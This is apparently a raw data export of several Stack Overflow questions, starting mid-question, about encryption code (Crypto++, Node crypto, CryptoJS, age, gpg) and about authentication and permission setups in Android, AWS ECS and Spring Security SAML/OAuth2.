    prng.GenerateBlock(salt, salt.size());  //A single salt is generated(Function name may be misleading)
    cerr &lt;&lt; &quot;salt size: &quot; &lt;&lt; salt.size() &lt;&lt; endl;
    return salt;
}

bool Cipher::generateRandomIV()
{
    iv.resize(AES::BLOCKSIZE);      //128 bits(default)
    prng.GenerateBlock(iv, iv.size());      //A single iv is generated(Function name may be misleading)
    cerr &lt;&lt; &quot;IV size: &quot; &lt;&lt; iv.size() &lt;&lt; endl;
    return true;
}

</code></pre>
<p>This is the code in my main method to test encryption and decryption(by changing the cipher. each time)</p>
<pre><code>int main()
{
    const char* inputFileName = R&quot;(C:path.&lt;textfile&gt;.txt)&quot;;
    const char* otuputFileName = R&quot;(C:path.&lt;textfile&gt;.txt)&quot;;
    const char* password = &quot;test&quot;;

    Cipher cipher(password);

    if (cipher.decryptFile(inputFileName, otuputFileName))
    {
        cout &lt;&lt; &quot;Decryption successfull&quot; &lt;&lt; endl;
    }
    else
    {
        cerr &lt;&lt; &quot;Decryption failed&quot; &lt;&lt; endl;
    }

    return 0;
}
</code></pre>
<p>Basically when I try to decrypt the file, I seem to have a problem with passing the cipher text through the decrypt filter, as when I do that all the data inside of the file disappears.</p>
<p>I will give the entire decryption function just in case it is useful and then below show only the relevant snippet.</p>
<p>Decryption function:</p>
<pre><code>bool Cipher::decryptFile(const char* inputFileName, const char* outputFileName)
{
    try {
        ifstream inputFile(inputFileName, ios::binary);
        ofstream outputFile(outputFileName, ios::binary | ios::trunc);

        if (!inputFile.is_open() || !outputFile.is_open())
        {
            cerr &lt;&lt; &quot;Error opening files&quot; &lt;&lt; endl;
            return false;
        }

        salt.resize(16);
        iv.resize(16);
        inputFile.read(reinterpret_cast&lt;char*&gt;(salt.data()) , salt.size());
        inputFile.read(reinterpret_cast&lt;char*&gt;(iv.data()), iv.size());

        cerr &lt;&lt; &quot;Read salt: &quot;;
        StringSource(reinterpret_cast&lt;const byte*&gt;(salt.data()), salt.size(), true, new HexEncoder(new FileSink(cerr)));
        cerr &lt;&lt; endl;

        cerr &lt;&lt; &quot;Read IV: &quot;;
        StringSource(reinterpret_cast&lt;const byte*&gt;(iv.data()), iv.size(), true, new HexEncoder(new FileSink(cerr)));
        cerr &lt;&lt; endl;

        if (!deriveKeyFromPassword(storedPassword, strlen(storedPassword), salt))
        {
            cerr &lt;&lt; &quot;Key derivation failed&quot; &lt;&lt; endl;
            return false;
        }

        CFB_Mode&lt;AES&gt;::Decryption decryption(key, key.size(), iv);  //Decryption Algorithm

        StreamTransformationFilter filter(decryption, new FileSink(outputFileName));    //Decryption Filter

        //inputFile.seekg(0, ios::end);
        inputFile.seekg(salt.size() + iv.size());   //Skip salt and IV
        size_t fileSize = inputFile.tellg();    
        inputFile.seekg(0);

        vector&lt;char&gt; fileBuffer(fileSize);
        inputFile.read(fileBuffer.data(), fileSize);

        cerr &lt;&lt; &quot;size&quot; &lt;&lt; fileBuffer.size() &lt;&lt; endl;
        filter.Put(reinterpret_cast&lt;const byte*&gt;(fileBuffer.data()), fileSize);
        filter.MessageEnd();
        
        //Destory filter object
        filter.Detach(new FileSink(outputFileName));

        size_t outputSize = filter.MaxRetrievable();
        cerr &lt;&lt; &quot;size after&quot; &lt;&lt; outputSize &lt;&lt; endl;

        if (outputSize &gt; 0)
        {
            vector&lt;byte&gt; decryptedOutput(outputSize);
            filter.Get(decryptedOutput.data(), outputSize);

            // Write the decrypted data to the output file
            outputFile.write(reinterpret_cast&lt;const char*&gt;(decryptedOutput.data()), outputSize);

            cerr &lt;&lt; &quot;Data written&quot; &lt;&lt; endl;
        }
        else
        {
            cerr &lt;&lt; &quot;No data retrieved from the filter.&quot; &lt;&lt; endl;
        }

        inputFile.close();
        outputFile.close();

        return true;
    }
    catch(const ifstream::failure&amp; e)
    {
        cerr &lt;&lt; &quot;File I/O error: &quot; &lt;&lt; e.what() &lt;&lt; endl;
        return false;
    }
    catch(const Exception&amp; e)
    {
        cerr &lt;&lt; &quot;Decryption error: &quot; &lt;&lt; e.what() &lt;&lt; endl;
        return false;
    }
}
</code></pre>
<p>The problematic part is here:</p>
<pre><code>CFB_Mode&lt;AES&gt;::Decryption decryption(key, key.size(), iv);  //Decryption Algorithm

StreamTransformationFilter filter(decryption, new FileSink(outputFileName));    //Decryption Filter

//inputFile.seekg(0, ios::end);
inputFile.seekg(salt.size() + iv.size());   //Skip salt and IV
size_t fileSize = inputFile.tellg();    
inputFile.seekg(0);

vector&lt;char&gt; fileBuffer(fileSize);
inputFile.read(fileBuffer.data(), fileSize);

cerr &lt;&lt; &quot;size&quot; &lt;&lt; fileBuffer.size() &lt;&lt; endl;
filter.Put(reinterpret_cast&lt;const byte*&gt;(fileBuffer.data()), fileSize);
filter.MessageEnd();

//Destory filter object
filter.Detach(new FileSink(outputFileName));

size_t outputSize = filter.MaxRetrievable();
cerr &lt;&lt; &quot;size after&quot; &lt;&lt; outputSize &lt;&lt; endl;
</code></pre>
<p>I am creating a new decryption algorithm and a new decryption filter for the outputFileName FileSink.I then skip the salt and iv in my cipher text file(As due to the best of my understanding these are stored at the beginning of the file) and read the file size while also starting from position 0. The contents are now put in a new fileBuffer(which excludes the salt and IV) to which then I proceed to pass these contents through the filter.</p>
<p>Up to this point it was not working so I tried to destroy the filter object to flush anything stored inside. When I retrieve the size after I still get 0 though, thus I am still left with this problem.</p>
<pre><code>The output of putting a text file through encryption is as follows:
salt size: 16
IV size: 16
Derived Key: 4A68118A4B978617A7E38AAE2D91FDE6
Read salt: 42660BBE161C4E08E5DD4CBCC74CC952
Read IV: 7067030BACB4ED6F5AC0F1465383E46E
Encryption successful
</code></pre>
<p>The output of putting the new cipher file(from the previous text file) is as follows:</p>
<pre><code>Derived Key: 4A68118A4B978617A7E38AAE2D91FDE6
Read salt: 42660BBE161C4E08E5DD4CBCC74CC952
Read IV: 7067030BACB4ED6F5AC0F1465383E46E
size32
size after0
No data retrieved from the filter.
Decryption successfull
</code></pre>
<p>The salt , IV and derive key are all being passed correctly at first glance, also the size before is 32 and size after is 0 bits hinting that the data just vanishes? Ofcourse no data is retrieved from the filter, this was just my testing of the matter and the decryption is indeed successfull but there was nothing to decrypt? I am a bit lost at this stage</p>
"
"<p>I am using <strong>AES-256-CFB</strong> encryption method to encrypt text but when decrypting using the same parameters it doesn't give the text I encrypted</p>
<p>Code used to encrypt</p>
<pre><code>const ss = Buffer.from(decipher.update(sender.ss, &quot;hex&quot;, &quot;hex&quot;), &quot;hex&quot;);
const iv = crypto.randomBytes(16);
const cipher = crypto.createCipheriv(process.env.encryptionMethod, ss, iv);
const encryptedMsg = cipher.update(req.body.msg, &quot;utf8&quot;, &quot;utf8&quot;) + cipher.final(&quot;utf8&quot;);
</code></pre>
<p>Code to Decrypt</p>
<pre><code>const decipherMsg = crypto.createDecipheriv(process.env.encryptionMethod, ss, Buffer.from(msg.iv, &quot;hex&quot;));
const msgText = decipherMsg.update(msg.msg.toString(&quot;utf8&quot;), &quot;utf8&quot;, &quot;utf8&quot;) + decipherMsg.final(&quot;utf8&quot;);
</code></pre>
<p>I have made sure that the key (ss) and initial vector (iv) are same in both cases. The following is an example:</p>
<ul>
<li>req.body.msg: hi</li>
<li>encryptedMsg: �D</li>
<li>Buffer of encryptedMsg: &lt;Buffer ef bf bd 44&gt;</li>
</ul>
<hr />
<ul>
<li>msg.msg: &lt;Buffer ef bf bd 44&gt;</li>
<li>msg.msg.toString(&quot;utf8&quot;): �D</li>
<li>msgText: &gt;�b�</li>
</ul>
"
"<p>Age is a practical toos for file encryption, here it is its presentation page: <a href=""https://github.com/FiloSottile/age"" rel=""nofollow noreferrer"" title=""https://github.com/FiloSottile/age"">age</a>.</p>
<p>With <code>age-keygen</code>, we are going to be able to create a couple of public key and private key together like below:</p>
<pre><code># created: 2024-02-14T17:14:05+01:00
# public key: age1zskjrcgkgqhjaksa22ze85wy0wy2xg8sf7j8fntdgz2d4h25rp9sz76q7p
AGE-SECRET-KEY-1SA9KV6M7C27GFW22ZXED69SAATLH3UMDUSN720AQR0JEN2YTU0MS7FFZA2
</code></pre>
<p>Where we are going to have a pair of public key and private key (<code>AGE-SECRET-KEY-...</code>). We can use these information for encryption and decryption, no problem.</p>
<p>But what bothers me is that I haven't found a way to verify whether the public key and the private key of age couple. A similar example in openssl is below:</p>
<pre><code>openssl x509 -in cert.pem -noout -modulus | openssl md5
openssl rsa -in key.pem -noout -modulus | openssl md5
</code></pre>
<p>If the results generated are identical, we are going to be able to verify that <code>cert.pem</code> and <code>key.pem</code> are a pair. How can we achieve the similar functionality for age keys?</p>
<p>Thanks in advance!</p>
"
"<p>How gpg.exe is configured on windows? What is configuration for setting up the encryption and decryption?</p>
<p>Not sure how it is configured. Want to see where it is configuration and how the configuration looks like, any example will help.</p>
"
"<p>I can succesfully generate a key using a WordArray and log it to the console.
But when passing the encryptionKey to my encryption function it gets lost somewhere.
I generate the key in the encrypt function, pass it to a global variable so it may be used in the decryption function as well.
The line <code>const encrypted = CryptoJS.AES.encrypt(plainText, encryptionKey);</code> is where I'm suspecting the problem may lie. The plainText variable is indeed a string and is not undefined or null.</p>
<p>I wanted to generate a random key, using CryptoJS' WordArray.random(256/8), pass it to a global instance of the variable for later use in the decryption.</p>
<p>Key should be passed from one scope to the other and allow for the encryption function to run
The whole thing works fine if I pass my encryption function a hardcoded key as a string instead.</p>
<p>My JavaScript</p>
<pre><code>(function() {
    let encryptionKey;

    document.getElementById(&quot;encryptBtn&quot;).addEventListener(&quot;click&quot;, encrypt); 
    document.getElementById(&quot;decryptBtn&quot;).addEventListener(&quot;click&quot;, decrypt);
    
    function encrypt() { // Encrypt userinput plaintext in ID:cipherText
        encryptionKey = CryptoJS.lib.WordArray.random(256/8);
        console.log(&quot;encryptionKey&quot;, encryptionKey);

        const plainText = document.getElementById(&quot;plainText&quot;).value; 
        console.log(&quot;plaintext&quot;, plainText);

const encrypted = CryptoJS.AES.encrypt(plainText, encryptionKey);
        const encryptedString = encrypted.toString();
        console.log(&quot;encrypted&quot;, encryptedString);

        document.getElementById(&quot;cipherText&quot;).value = encryptedString; 
        console.log(&quot;Ciphertext:&quot; + cipherText);
    }
    
    function decrypt() { // Decrypt userinput plaintext in ID:decryptedText
        const cipherText = document.getElementById(&quot;cipherText&quot;).value;
        const decrypted = CryptoJS.AES.decrypt(cipherText,                                                                             encryptionKey).toString(CryptoJS.enc.Utf8);
        document.getElementById(&quot;decryptedText&quot;).value = decrypted;
    }
})();
</code></pre>
"
"<p>I am trying to attach a file to an e-mail Intent but get a SecurityException in the Logcat and the e-mail client (gmail) reports &quot;Unable to attach file&quot;:</p>
<p><code>java.lang.SecurityException: Permission Denial: reading com.pentad.bridge.FileProvider uri content://com.pentad.bridge.FileProvider/app_root/Android/data/com.pentad.bridge/files/Demo1.xml from pid=18762, uid=10199 requires the provider be exported, or grantUriPermission()</code></p>
<p>This only happens for some file suffixes it seems. Suffix &quot;.brf&quot; or &quot;.txt&quot; work fine, &quot;.xml&quot; reports the above error.</p>
<p>This happens on my Motorola G8 (Android 11) but a Motorola G6 (Android 9) works just fine.
For the G8 I've had to add some notification code and suspect this is where the fault lies.</p>
<p>The error message indicates that I should export my FileProvider, but when I tried that in the Manifest I got:</p>
<p><code>Caused by: java.lang.SecurityException: Provider must not be exported</code></p>
<p>AndroidManifest.xml:</p>
<pre><code>        &lt;provider
            android:name=&quot;com.pentad.bridge.FileProvider&quot;
            android:authorities=&quot;com.pentad.bridge.FileProvider&quot;
            android:exported=&quot;false&quot;
            android:grantUriPermissions=&quot;true&quot;&gt;
            &lt;meta-data android:name=&quot;android.support.FILE_PROVIDER_PATHS&quot;
                       android:resource=&quot;@xml/file_provider_paths&quot; /&gt;
        &lt;/provider&gt;
</code></pre>
<p>file_provider_paths:</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;paths xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;&gt;
    &lt;external-path name=&quot;app_root&quot; path=&quot;.&quot;/&gt;
&lt;/paths&gt;
</code></pre>
<p>Code FileProvider extends androidx.core.content.FileProvider:</p>
<pre><code>            // Build email Intent
            Uri    mailToUri   = Uri.fromParts(&quot;mailto&quot;, &quot;&quot;, null);
            Intent emailIntent = new Intent(Intent.ACTION_SEND, mailToUri);
            emailIntent.setType(&quot;text/plain&quot;);
            emailIntent.putExtra(Intent.EXTRA_SUBJECT, aSubject);
            emailIntent.putExtra(Intent.EXTRA_EMAIL, aStringArrayOfEmailAddress);
            emailIntent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
            emailIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            emailIntent.putExtra(Intent.EXTRA_TEXT, aMessage);

            // Build the attachment URI
            File attachFile = new File(baseDirectory, aFileName);
            Uri attachmentUri = androidx.core.content.FileProvider.getUriForFile(bridgeScorer, FileProvider.class.getCanonicalName(), attachFile);

            emailIntent.putExtra(Intent.EXTRA_STREAM, attachmentUri);

            // Try some other flags (which don't fix the problem).
            // emailIntent.setClipData(ClipData.newRawUri(&quot;&quot;, attachmentUri));
            // emailIntent.addFlags(Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION);
            // emailIntent.addFlags(Intent.FLAG_GRANT_PREFIX_URI_PERMISSION);
            // emailIntent.addFlags(Intent.FLAG_GRANT_WRITE_URI_PERMISSION);

            // Start the email activity
            if (Build.VERSION.SDK_INT &lt; Build.VERSION_CODES.Q)          // Earlier version can start e-mail Intent directly.
            {
                bridgeScorer.startActivity(emailIntent);
            }
            else
            {
                // Can't start e-mail directly, create a notification to do it.
                // Create the NotificationChannel if on API 26+.
                // Channel becomes permanently attached to the app (until the app is deleted).
                // Change CHANNEL_ID if new parameters required.
                if (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.O)
                {
                    NotificationChannel channel = new NotificationChannel(NOTIFICATION_CHANNEL_ID,
                                                                          NOTIFICATION_CHANNEL_NAME,
                                                                          NotificationManager.IMPORTANCE_HIGH);
                    channel.setDescription(&quot;BridgeScorer E-mail request&quot;);
                    NotificationManager notificationManager = bridgeScorer.getSystemService(NotificationManager.class);
                    notificationManager.createNotificationChannel(channel);
                }

                PendingIntent pendingIntent = PendingIntent.getActivity(bridgeScorer,       // Context
                                                                        0,                  // A unique ID (within this app).
                                                                        emailIntent,        // Intent to start.
                                                                        PendingIntent.FLAG_UPDATE_CURRENT);

                NotificationCompat.Builder builder = new NotificationCompat.Builder(bridgeScorer, NOTIFICATION_CHANNEL_ID)
                    .setCategory(Notification.CATEGORY_ALARM)                               // Try to over-ride DND.
                    .setSmallIcon(R.drawable.bridgescorer)
                    .setContentTitle(Config.getMessage(&quot;headingAppNotifyEmail&quot;))
                    .setContentText(Config.getMessage(&quot;promptShareFile&quot;) + &quot; &quot; + aFileName)
                    .setLargeIcon(BitmapFactory.decodeResource(bridgeScorer.getResources(), R.drawable.bridgescorer))
                    .setPriority(NotificationCompat.PRIORITY_DEFAULT)
                    .setTimeoutAfter(NOTIFICATION_TIMEOUT)
                    .setAutoCancel(true)
                    .setFullScreenIntent(pendingIntent, false);

                NotificationManagerCompat.from(bridgeScorer).notify(NOTIFICATION_ID, builder.build());
            }
</code></pre>
<p>After one answer (thanks), I've swapped the addFlags and setFlags calls around and things are better, but I'm still getting the &quot;requires the provider be exported, or grantUriPermission()&quot; error but only in the following circumstances (as far as I can tell, it's quite confusing).</p>
<p>For each suffix (I use .html, .xml, .pbn, .dup and .brf), the first time I attach a file with the suffix, all is well. And I can repeat the process for the same suffix with the same file name any number of times.</p>
<p>But if I subsequently attach a file with a different name (but a suffix I've previously attached a file with) then I get this error.</p>
<p>I tried &quot;force kill&quot; my app but same behaviour.</p>
<p>If I re-boot the phone, then we're back to the start, I can attach any file with any suffix until I've used the suffix once. After that I have to use the same file name again for that suffix.</p>
"
"<p>ECS.1   Amazon ECS task definitions should have secure networking modes and user definitions.</p>
<p>Given that AWS Batch necessitates the network mode to be 'host' for task definitions, how can we ensure that our Amazon ECS configurations maintain secure networking modes and user definitions, especially considering the ecs.1 Security Hub finding?</p>
<p>What should we do to address the security concern here?</p>
<p><a href=""https://repost.aws/questions/QULcYG3Nr_TAavAL2RjMkcnQ/aws-batch-job-instance-runs-with-ecs-network-host-mode"" rel=""nofollow noreferrer"">https://repost.aws/questions/QULcYG3Nr_TAavAL2RjMkcnQ/aws-batch-job-instance-runs-with-ecs-network-host-mode</a></p>
"
"<p>We have an application which uses spring security saml for SSO authentication for a client.
We needed to add a new SSO authentication for our internal users on the login page, so user_client need to click on sso_login_client button to be redirected on its IdP to log in, and user_internal on sso_login_internal button to be redirected on our IdP.</p>
<p>The problem is that our configuration is implemented for only one IdP. What do we need to change to support another IdP ?</p>
<p>Here is our configuration :</p>
<p>SecurityConfig.java</p>
<pre class=""lang-java prettyprint-override""><code>@EnableGlobalMethodSecurity(prePostEnabled = true)
@EnableWebSecurity
public class SecurityConfig {
    
    @Configuration
    @Order(1)
    @Profile(&quot;SSO&quot;)
    public static class WebSecurityConfig extends WebSecurityConfigurerAdapter implements InitializingBean, DisposableBean {
       
        private static final Logger logger = Logger.getLogger(SecurityConfig.class);
        private Timer backgroundTaskTimer;
        private MultiThreadedHttpConnectionManager multiThreadedHttpConnectionManager;
        
        private String metadataUrl = null;
        private String entityID = null;
        private String entityBaseURL = null;
        private String metadataFile = null;
        private String metadataRetrievalMode = null;
        private Long maxAuthenticationAge = null;
        
    ...
     
        // SAML Authentication Provider responsible for validating of received SAML
        // messages
        @Bean
        public CustomSamlAuthenticationProvider samlAuthenticationProvider() {
            CustomSamlAuthenticationProvider customSamlAuthenticationProvider = new CustomSamlAuthenticationProvider();
            customSamlAuthenticationProvider.setForcePrincipalAsString(false);
            return customSamlAuthenticationProvider;
        }
     
    ...
        
        // Setup advanced info about metadata
        @Bean
        public ExtendedMetadata extendedMetadata() {
                ExtendedMetadata extendedMetadata = new ExtendedMetadata();
                extendedMetadata.setIdpDiscoveryEnabled(false); 
                extendedMetadata.setSignMetadata(false);
                extendedMetadata.setEcpEnabled(true);
                return extendedMetadata;
        }
        
        
        @Bean
        @Qualifier(&quot;idp-adfs&quot;)
        public ExtendedMetadataDelegate adfsExtendedMetadataProvider()
                throws MetadataProviderException {
            ExtendedMetadataDelegate extendedMetadataDelegate = null;
            
            if (&quot;FILE&quot;.equals(metadataRetrievalMode)) {
                   FilesystemMetadataProvider fileSystemMetadataProvider = new FilesystemMetadataProvider(new File(metadataFile));
                    fileSystemMetadataProvider.setParserPool(parserPool());
                    
                    extendedMetadataDelegate = new ExtendedMetadataDelegate(fileSystemMetadataProvider, extendedMetadata());
                    extendedMetadataDelegate.setMetadataTrustCheck(false);
                    extendedMetadataDelegate.setMetadataRequireSignature(false);
            } else {
                 String idpKeycloakMetadataURL = metadataUrl;
                 HTTPMetadataProvider httpMetadataProvider = new HTTPMetadataProvider(
                            this.backgroundTaskTimer, httpClient(), idpKeycloakMetadataURL);
                httpMetadataProvider.setParserPool(parserPool());
                
                extendedMetadataDelegate = new ExtendedMetadataDelegate(httpMetadataProvider, extendedMetadata());
                // Disable metadata trust check to prevent &quot;Signature trust establishment failed for metadata entry&quot; exception
                extendedMetadataDelegate.setMetadataTrustCheck(false);
                extendedMetadataDelegate.setMetadataRequireSignature(false);
            }
            
            backgroundTaskTimer.purge();
            return extendedMetadataDelegate;
        }

        // IDP Metadata configuration - paths to metadata of IDPs in circle of trust
        // is here
        // Do no forget to call iniitalize method on providers
        @Bean
        @Qualifier(&quot;metadata&quot;)
        public CachingMetadataManager metadata() throws MetadataProviderException {
            
              List&lt;MetadataProvider&gt; providers = new ArrayList&lt;MetadataProvider&gt;();
                providers.add(adfsExtendedMetadataProvider());
                CachingMetadataManager metadataManager=new CachingMetadataManager(providers);
                metadataManager.setDefaultIDP(metadataUrl);
                return new CachingMetadataManager(providers);
        }
     
        // Filter automatically generates default SP metadata
        @Bean
        public MetadataGenerator metadataGenerator() {
            MetadataGenerator metadataGenerator = new MetadataGenerator();
            metadataGenerator.setEntityId(entityID);
            if (entityBaseURL != null) {
                metadataGenerator.setEntityBaseURL(entityBaseURL);
            }
            metadataGenerator.setExtendedMetadata(extendedMetadata());
            metadataGenerator.setIncludeDiscoveryExtension(false);
            metadataGenerator.setKeyManager(keyManager()); 
            metadataGenerator.setRequestSigned(false);
            return metadataGenerator;
        }
     

    ...
         
        @Bean
        public SAMLWebSSOHoKProcessingFilter samlWebSSOHoKProcessingFilter() throws Exception {
            SAMLWebSSOHoKProcessingFilter samlWebSSOHoKProcessingFilter = new SAMLWebSSOHoKProcessingFilter();
            samlWebSSOHoKProcessingFilter.setAuthenticationSuccessHandler(successRedirectHandler());
            samlWebSSOHoKProcessingFilter.setAuthenticationManager(authenticationManager());
            samlWebSSOHoKProcessingFilter.setAuthenticationFailureHandler(authenticationFailureHandler());
            return samlWebSSOHoKProcessingFilter;
        }
        
        // Processing filter for WebSSO profile messages
        @Bean
        public SAMLProcessingFilter samlWebSSOProcessingFilter() throws Exception {
            SAMLProcessingFilter samlWebSSOProcessingFilter = new CustomSamlProcessingFilter();
            samlWebSSOProcessingFilter.setAuthenticationManager(authenticationManager());
            samlWebSSOProcessingFilter.setAuthenticationSuccessHandler(successRedirectHandler());
            samlWebSSOProcessingFilter.setAuthenticationFailureHandler(authenticationFailureHandler());
            return samlWebSSOProcessingFilter;
        }
         
        @Bean
        public MetadataGeneratorFilter metadataGeneratorFilter() {
            return new MetadataGeneratorFilter(metadataGenerator());
        }
    
        @Override  
        protected void configure(HttpSecurity http) throws Exception {
            http.csrf().disable();
            http
                .httpBasic()
                    .authenticationEntryPoint(samlEntryPoint());      
            http
                    .addFilterBefore(metadataGeneratorFilter(), ChannelProcessingFilter.class)
                    .addFilterAfter(samlFilter(),BasicAuthenticationFilter.class)
                    .addFilterBefore(samlFilter(), CsrfFilter.class);
            http .requestMatchers()        
                .antMatchers(&quot;/loginSSO/**&quot;,&quot;/saml/**&quot;).and().authorizeRequests()
                    .anyRequest().authenticated();
            http
                    .logout()
                    .disable(); // The logout procedure is already handled by SAML filters.
            
        }
     
        
        @Override
        protected void configure(AuthenticationManagerBuilder auth) throws Exception {
            auth
                .authenticationProvider(samlAuthenticationProvider());
        }
        
    }
}
</code></pre>
<p>LoginSSOController.java</p>
<pre class=""lang-java prettyprint-override""><code>@Controller
public class LoginSSOController {
    
    // Logger
        private static final Logger logger = Logger.getLogger(LoginSSOController.class);

        @RequestMapping(value = &quot;/loginSSO&quot;, method = RequestMethod.GET)
        public View idpSelection(HttpServletRequest request, Model model) {
            Authentication auth = SecurityContextHolder.getContext().getAuthentication();
            if (auth == null) {
                logger.debug(&quot;Current authentication instance from security context is null&quot;);
            }else {
                logger.debug(&quot;Current authentication instance from security context: &quot;);
            }
            if (auth == null) {
                RedirectView redirect = new RedirectView(&quot;/login&quot;);
                redirect.setExposeModelAttributes(false);
                return redirect;
            }
            RedirectView redirect = new RedirectView(&quot;/dashboard&quot;);
            redirect.setExposeModelAttributes(false);
            return redirect;
        }
}
</code></pre>
<p>login.html</p>
<pre class=""lang-html prettyprint-override""><code>&lt;a href=&quot;/loginSSO&quot; class=&quot;logAD btn&quot;&gt;&lt;i class=&quot;fa fa-windows&quot;&gt;
    &lt;/i&gt; &lt;span th:text=&quot;${loginPageSSOLabel}&quot;&gt;Login with SSO&lt;/span&gt;
&lt;/a&gt;
</code></pre>
<p>I heard about RelyingPartyRegistration but i don't know if it's the right solution for our configuration and how to implement it.</p>
<p>Also i am wondering how does spring-security distinguish multiple IdPs for different users ? Do we need to create a new endpoint like &quot;/loginSSO&quot; ?</p>
<p>Thank you for your help in advance.</p>
"
"<p>I have x number of Java Web apps as standalone war files and the source code is not available and need to setup a Tomcat or TomEE container to act as the Relying Party as well as using Microsoft Entra ID enterprise apps with a non-gallery SAML setup as the IDP.</p>
<p>Is it possible to use the spring-security-saml2-service-provider jar as referenced here: <a href=""https://mvnrepository.com/artifact/org.springframework.security/spring-security-saml2-service-provider"" rel=""nofollow noreferrer"">https://mvnrepository.com/artifact/org.springframework.security/spring-security-saml2-service-provider</a></p>
<p>I was able to get a PoC working with the Apache Fediz Tomcat plugin: fediz-tomcat-1.6.1.jar, but only with Tomcat9 and JDK8, and realized that Fediz won't work in our situation because we're using TomEE as the container with JDK21 and I believe Fediz was compiled JDK8 and is using javax whereas TomEE uses Jarkarta.</p>
<p>The ideal situation would be to just pull the spring-security-saml2-service-provider.jar and drop it in the lib folder within Tomcat or TomEE and then configure xml or property files that use the the metadata provided by Entra ID.</p>
<p>Thanks for any suggestions.</p>
<p>I have tried Apache Fediz and cannot use due to JDK version.
I was expecting to find some information on how to setup Tomcat as the Relying Party using spring-security-saml2-service-provider with MSFT Entra ID, but not sure where to start.</p>
"
"<p>I have an Spring MVC jsf application. Each page/endpoint requests are secured with <code>customAuthorizationManager</code>.</p>
<p>I'm trying to redirect any unauthenticated/unauthorized request to our OAuth2 server's login page (<strong>https://xxx/op/v1/auth</strong>).</p>
<pre><code>@Configuration
@EnableWebSecurity
public class SecurityConfiguration {

    .....

    @Bean
    @Order(1)
    public SecurityFilterChain filterChain1(HttpSecurity http) throws Exception {
        http
                .authorizeHttpRequests(authorizeRequests -&gt;
                        authorizeRequests.anyRequest().access(customAuthorizationManager)
                )
                // Redirect to the OAuth 2.0 Login endpoint when not authenticated from the authorization endpoint
                .exceptionHandling(exceptions -&gt; exceptions
                        .defaultAuthenticationEntryPointFor(
                                new LoginUrlAuthenticationEntryPoint(&quot;https://xxx/op/v1/auth&quot;),
                                new MediaTypeRequestMatcher(MediaType.TEXT_HTML)
                        )
                );

        return http.build();
    }

    @Bean
    @Order(2)
    public SecurityFilterChain filterChain2(HttpSecurity http) throws Exception {
        http
                // OAuth2 Login handles the redirect to the OAuth 2.0 Login endpoint from the authorization server filter chain above
                .oauth2Login(Customizer.withDefaults())
                .oauth2Client(c -&gt; this.customClientRegistration());

        return http.build();
    }

    @Bean
    public ClientRegistrationRepository clientRegistrationRepository() {
        return new InMemoryClientRegistrationRepository(this.customClientRegistration());
    }

    private ClientRegistration customClientRegistration() {
        return ClientRegistration
                .withRegistrationId(&quot;my-combined-client&quot;)
                .clientId(&quot;4d06125e-xxx&quot;)
                .authorizationGrantType(AuthorizationGrantType.AUTHORIZATION_CODE)
                .redirectUri(&quot;https://xxx&quot;)
                .authorizationUri(&quot;https://xxx/op/v1/auth&quot;)
                .tokenUri(&quot;https://xxx/op/v1/token&quot;)
                .userInfoUri(&quot;https://xxx/op/v1/userinfo&quot;)
                .jwkSetUri(&quot;https://xxx/op/v1/keys&quot;)
                .build();
    }

}
</code></pre>
<p>I see that an unauthorized request is rejected and redirected to the login page fine but not with the right <strong>client-id</strong> as defined in <code>customClientRegistration</code> (<strong>4d06125e-xxx</strong>)</p>
<p><a href=""https://i.stack.imgur.com/4NPIB.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/4NPIB.png"" alt=""request1"" /></a></p>
<p><a href=""https://i.stack.imgur.com/M0IoI.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/M0IoI.png"" alt=""request2"" /></a></p>
<p>So, could you please help me with the redirection of these unauthenticated/unauthorized requests to the external OAuth login page?</p>
<hr />
<p><strong>UPDATE 1</strong> @ch4mp 's comment</p>
<p>I've removed the second filter and append his content into the first but the result is the same:</p>
<pre><code>@Bean
@Order(1)
public SecurityFilterChain filter1(HttpSecurity http) throws Exception {
    http
            .authorizeHttpRequests(authorizeRequests -&gt;
                    authorizeRequests.anyRequest().access(customAuthorizationManager)
            )
            // Redirect to the OAuth 2.0 Login endpoint when not authenticated from the authorization endpoint
            .exceptionHandling(exceptions -&gt; exceptions
                    .defaultAuthenticationEntryPointFor(
                            new LoginUrlAuthenticationEntryPoint(&quot;https://xxx/op/v1/auth&quot;),
                            new MediaTypeRequestMatcher(MediaType.TEXT_HTML)
                    )
            )
            .oauth2Login(Customizer.withDefaults())
            .oauth2Client(c -&gt; this.customClientRegistration());

    return http.build();
}

/*@Bean
@Order(2)
public SecurityFilterChain filter2(HttpSecurity http) throws Exception {
    http
            // OAuth2 Login handles the redirect to the OAuth 2.0 Login endpoint from the authorization server filter chain above
            .oauth2Login(Customizer.withDefaults())
            .oauth2Client(c -&gt; this.customClientRegistration());

    return http.build();
}*/
</code></pre>
<hr />
<p><strong>UPDATE 2</strong> @ch4mp 's answer</p>
<pre><code>@Bean
@Order(1)
public SecurityFilterChain filter1(HttpSecurity http) throws Exception {
    http
            .authorizeHttpRequests(authorizeRequests -&gt;
                    authorizeRequests.anyRequest().access(customAuthorizationManager)
            )
            // Redirect to the OAuth 2.0 Login endpoint when not authenticated from the authorization endpoint
            /*.exceptionHandling(exceptions -&gt; exceptions
                    .defaultAuthenticationEntryPointFor(
                            new LoginUrlAuthenticationEntryPoint(&quot;https://xxx/op/v1/auth&quot;),
                            new MediaTypeRequestMatcher(MediaType.TEXT_HTML)
                    )
            )*/
            .oauth2Login(Customizer.withDefaults())
            .oauth2Client(c -&gt; this.customClientRegistration());

    return http.build();
}
</code></pre>
<p>I've removed the <code>.exceptionHandling</code> . It does a request to <code>https://myAppPath/oauth2/authorization/my-combined-client</code> instead of to the server defined in the client <code>https://xxx/op/v1/auth</code>. So 404.</p>
"
"<p>I am in the process of upgrading to Spring 6 and Spring Security 6 but I am not able to get to my login page. Depending on how I set it up, I either get a 403, or redirected to the login page from the login page creating an infinite loop.</p>
<p>I have modified my Security Config to use <code>SecurityFilterChain</code> and converted my paths to Mvc paths instead of Ant paths.</p>
